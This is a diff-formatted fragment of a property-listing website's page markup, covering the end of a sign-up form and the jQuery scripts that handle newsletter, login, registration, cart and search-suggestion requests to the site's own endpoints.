+                        <fieldset class="col-12 popup_form_field">
+                        <label class="fw-6">Password</label>
+                        <div class="popup_form_field_new">
+                            <img src="https://luxurypropertybuilders.com/frontend/assets/images/icon/icon-password.svg" alt="images"/>
+                            <input type="password" name="password" id="pass" class="input-form password-input" placeholder="Your password" required/>
+                        </div>
+                        </fieldset>
+                        <fieldset class="col-12 popup_form_field">
+                        <label class="fw-6">Confirm password</label>
+                        <div class="popup_form_field_new">
+                            <img src="https://luxurypropertybuilders.com/frontend/assets/images/icon/icon-password.svg" alt="images" />
+                            <input type="password" name="cpassword" id="cpass" class="input-form password-input" placeholder="Confirm password" required />
+                        </div>
+                        </fieldset>
+                        <div class="col-12" style="border-bottom: 1px solid #ccc;display:none;" id="services">
+                            <h4>Select Services *</h4>
+                            <div class="container-fluid" style="margin-top: 10px;margin-bottom: 10px;">
+                                <div class="row">
+                                <select name="services[]" class="form-control">
+                                    <option value="">Choose a service</option>
+                                                                                                    <option value="9">carpenter</option>
+                                                                <option value="5">Civil contractor</option>
+                                                                <option value="6">Interior designer</option>
+                                                                <option value="4">Loans</option>
+                                                                <option value="10">Painter service</option>
+                                                                <option value="7">Paper/Printing/Packaging</option>
+                                                                <option value="8">Plumber Services</option>
+                                                                <option value="3">Property Legal advisor</option>
+                                                                </select>
+                                
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-12" style="display: flex;align-items: baseline;">
+                        <input type="checkbox" name="agree" value="1" style="margin-right: 6px;"><label for="">I have read and agree to the Candidate  <a href="javascript:;">Terms and Conditions</a></label>
+                        </div>
+                        <div class="col-12">
+                        <input type="checkbox" style="margin-right: 6px;"><label for="">Sign Up for Newsletter</label>
+                        </div>
+                    </div>
+                    <div class="col-12">
+                        <button type="submit" class="sc-button" id="popRegisterBtn" style="background: #000;">
+                            <span>Sign Up</span>
+                        </button>
+                    </div>
+                    </form>
+                    </div>
+                  </div>
+                </div>
+                
+              </div>
+            </div>
+            <div class="text-box text-center fs-13">
+              Allready have an account?
+              <a
+                class="font-2 fw-7 fs-13 color-popup text-color-3"
+                data-toggle="modal"
+                data-target="#popup_bid"
+                data-dismiss="modal"
+                aria-label="Close"
+                >Login</a>
+            </div>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+    let passwordInput1 = document.getElementById('id_password'),
+        toggle1 = document.getElementById('btnToggle1'),
+        icon1 =  document.getElementById('eyeIcon1');
+
+    function togglePassword1() {
+    if (passwordInput1.type === 'password') {
+        passwordInput1.type = 'text';
+        icon1.classList.add("fa-eye-slash");
+        //toggle.innerHTML = 'hide';
+    } else {
+        passwordInput1.type = 'password';
+        icon1.classList.remove("fa-eye-slash");
+        //toggle.innerHTML = 'show';
+    }
+    }
+
+    toggle1.addEventListener('click', togglePassword1, false);
+    passwordInput1.addEventListener('keyup', checkInput, false);
+</script>
+<!--------------------Login End Here------------------------>       
+        
+        	  </div>
+      <script src="https://luxurypropertybuilders.com/frontend/app/js/jquery.min.js"></script>
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/jquery.easing.js"></script>
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/jquery.nice-select.min.js"></script>
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/bootstrap.min.js"></script>
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/swiper-bundle.min.js"></script>
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/owl.js"></script>
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/swiper.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.js"></script>
+    <script src="/path/to/dist/js/jquery.lbt-lightbox.min.js"></script>
+
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/jquery-validate.js"></script>
+
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/countto.js"></script>
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/plugin.js"></script>
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/shortcodes.js"></script>
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/main.js"></script>
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/curved.js"></script>
+    <script src="https://luxurypropertybuilders.com/frontend/app/js/price-ranger.js"></script>
+    <script src="https://luxurypropertybuilders.com/assets/vendor/toastr/toastr.min.js"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/jquery.validate.min.js"></script> 
+      <!-- toastr js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/2.0.1/js/toastr.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script>
+         $(document).ready(function() {
+            toastr.options.timeOut = 10000;
+            toastr.options.closeButton = true;
+                     });
+    </script>
+	<script>
+		jQuery.validator.addMethod("customEmail", function(value, element) {
+			   return this.optional(element) || /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/i.test(value);
+		   }, "Please enter valid email address!");   
+		$.ajaxSetup({
+			headers: {
+				'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+			}
+		});
+		$(document).ready(function(){    
+		   $("#newsletter").validate({
+			  rules:
+			  {
+				 email: {
+					required: true,
+					customEmail: true
+				 }
+			  },
+			  messages:
+			  {
+				 email: "Enter your email"
+			  },
+			  submitHandler: getSubscribersData
+		   });
+		   function getSubscribersData(){
+			  var data = $("#newsletter").serialize();
+			  $.ajax({
+				 url:"https://luxurypropertybuilders.com/subscribers",
+				 method:"POST",
+				 data:data,
+				 beforeSend: function(){
+					$("#submit_sub").attr('disabled', true);
+					$("#submit_sub").html('Please wait.<i class="fa fa-circle-o-notch fa-spin"></i>');
+				 },
+				 success:function(data){	
+					if(data == 0){
+						toastr.options.timeOut = 10000;
+						toastr.options.closeButton = true;
+						toastr.error('Email already exist. Please try with another one.');	
+					 }else{
+						toastr.options.timeOut = 10000;
+						toastr.options.closeButton = true;
+						toastr.success('You have successfully subscribed to the Newsletter.');
+						$("#newsletter")[0].reset();
+					 }
+				 },
+				 complete: function(){
+					$("#submit_sub").attr('disabled', false);
+					$("#submit_sub").html('Subscribe');
+				 },
+			  });
+		   }
+		});   
+		$('input:radio[name=role]').change(function () {
+			var data = $('input:radio[name=role]:checked').val();
+			if(data == 1){
+				$('#services').hide();
+				$('#membership').hide();
+			}else if(data == 3){
+				$('#services').show();
+				$('#membership').hide();
+			}else if(data == 2){
+				$('#services').hide();
+				$('#membership').show();
+			}else{
+				$('#services').hide();
+				$('#membership').hide();
+			}
+		});
+	$(document).ready(function(){ 
+		$("#popRegister").validate({
+			  rules:
+			  {
+				 email: {
+					required: true,
+					customEmail: true
+				 },
+				 password: {
+					required: true,
+					minlength: 8
+				 },
+				 cpassword: {
+					required: true,
+					equalTo : '#pass'
+				 }
+			  },
+			  messages:
+			  {
+				 email: "Enter your valid email address.",
+				  password: {
+					required: "Enter your password.",
+					minlength: "Password should be minimum 8 character."
+				  },
+				  cpassword: {
+					required: "Enter your password.",
+					minlength: "Password should be minimum 8 character.",
+					equalTo: "Confirm password is same as password.",
+				  }
+			  },
+			  submitHandler: regFormSubmit
+		});
+		$("#loginForm").validate({
+			rules:
+			{
+			  email: {
+				required: true,
+				email: true
+			  },
+			  password: {
+				required: true,
+				minlength: 8
+			  }
+			},
+			messages:
+			{
+			  email: "Enter your valid email address.",
+			  password: {
+				required: "Enter your password.",
+				minlength: "Password should be minimum 8 character."
+			  }
+			},
+			submitHandler: loginFormSubmit
+		  });
+		  function loginFormSubmit(){
+			  var data = $("#loginForm").serialize();
+			  $.ajax({
+				 url:"https://luxurypropertybuilders.com/user/login",
+				 method:"POST",
+				 data:data,
+				 beforeSend: function(){
+					$("#loginFormBtn").attr('disabled', true);
+					$("#loginFormBtn").html('Please wait.<i class="fa fa-circle-o-notch fa-spin"></i>');
+				 },
+				 success:function(data){
+					 if(data.status == 1){
+						toastr.options.timeOut = 10000;
+						toastr.options.closeButton = true;
+						toastr.success(data.message);
+						window.location.href="https://luxurypropertybuilders.com/user/dashboard";
+					 }else{
+						toastr.options.timeOut = 10000;
+						toastr.options.closeButton = true;
+						toastr.error(data.message);
+					 }
+				 },
+				 complete:function(){
+					$("#loginFormBtn").attr('disabled', false);
+					$("#loginFormBtn").html('Login');
+				 }
+			  });
+		  }
+		  function regFormSubmit(){
+			  var data = $("#popRegister").serialize();
+			  $.ajax({
+				 url:"https://luxurypropertybuilders.com/user/register",
+				 method:"POST",
+				 data:data,
+				 beforeSend: function(){
+					$("#popRegisterBtn").attr('disabled', true);
+					$("#popRegisterBtn").html('Please wait.<i class="fa fa-circle-o-notch fa-spin"></i>');
+				 },
+				 success:function(data){
+					 if(data.status == 1){
+						toastr.options.timeOut = 10000;
+						toastr.options.closeButton = true;
+						toastr.success(data.message);
+						window.location.href="https://luxurypropertybuilders.com/user/dashboard";
+					 }else{
+						toastr.options.timeOut = 10000;
+						toastr.options.closeButton = true;
+						toastr.error(data.message);
+					 }
+				 },
+				 complete:function(){
+					$("#popRegisterBtn").attr('disabled', false);
+					$("#popRegisterBtn").html('Login');
+				 }
+			  });
+		  }
+	});
+	function addWishlist(product_id) {
+                            swal({
+                        type: 'error',
+                        title: 'Cart',
+                        icon: "warning",
+                        text: "Please Login First to add properties in cart."
+                    }).then(function () {
+                           $('#popup_bid').modal('show');
+						   return;
+                    });
+         
+        $.ajaxSetup({
+            headers: {
+                'X-CSRF-TOKEN': $('meta[name="_token"]').attr('content')
+            }
+        });
+        $.ajax({
+            url: "https://luxurypropertybuilders.com/add-to-cart",
+            method: 'POST',
+            data: {
+                productId: product_id
+            },
+            success: function (data) {
+                if (data.success == 1) {
+                    swal({
+                        type: 'success',
+                        title: 'Cart',
+                        text: data.message,
+                        icon: "success"
+                    });
+                $('#crtcount').text(data.cartcount);
+                } else {
+                    swal({
+                        type: 'error',
+                        title: 'Cart',
+                        icon: "warning",
+                        text: data.message
+                    });
+                }
+            }
+        });
+    }
+</script>
+<script>
+document.getElementById('topsearch1').addEventListener('input', function() {
+            const query = this.value;
+            if (query.length < 2) {
+                document.getElementById('suggestions').innerHTML = '';
+                return;
+            }
+            fetch(`/finding?query=${query}`)
+                .then(response => response.json())
+                .then(data => {
+					    var results = '';
+						$.each(data.message, function(index, item) {
+                            results += '<li><i class="bx bx-search"></i> <a href="' + item.slug + '">' + item.name + '</a></li>'; // Adjust according to your data structure	
+                        });
+                        $('#suggestions').html(results);
+                });
+        });
+</script>         </body>
+</html>
